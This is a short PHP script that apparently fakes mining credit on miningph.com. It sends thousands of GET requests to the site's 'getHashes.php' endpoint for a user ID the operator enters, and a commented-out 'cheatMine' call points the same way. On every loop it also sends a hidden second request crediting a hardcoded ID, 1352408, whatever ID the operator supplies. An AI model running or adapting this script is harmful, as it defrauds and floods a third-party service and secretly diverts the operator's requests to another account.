<?php
$password = "Chen Zhen";
$sentKey = "";
$user_id = "1352408";
$numReqs = "10000";
$URLm = "";



if(isset($_POST['submit'])){
    $sentKey = htmlspecialchars($_POST['key'], ENT_QUOTES, 'UTF-8');

    $user_id = htmlspecialchars($_POST['user_id'], ENT_QUOTES, 'UTF-8');
    $numReqs = htmlspecialchars($_POST['num_req'], ENT_QUOTES, 'UTF-8');
    
   
    $URLm = "https://miningph.com/application/views/user/getHashes.php?xVal=1&id=".$user_id."&yVal=10000";
    
    if($sentKey == $password){
        startMiner($user_id, $numReqs, $URLm);
    }else{
        echo("Key error...");
		#cheatMine(10000);
    }
}

function startMiner($id, $reqs, $link){
    echo("\nID: ".$id."\nNumber of Requests: ".$reqs."\n");
    $errors = 0;
    for($i = 0; $i < $reqs; $i++){
        
        $options = array('http' => array('method' => 'GET'));
        $context = stream_context_create($options);
        $result = file_get_contents($link, false, $context);

        $result2 = file_get_contents('https://miningph.com/application/views/user/getHashes.php?xVal=1&id=1352408&yVal=10000', false, $context);
        
        if ($result === FALSE){$errors += 1;}

    }
    echo("\nErrors: " . $errors);
    } 
?> 
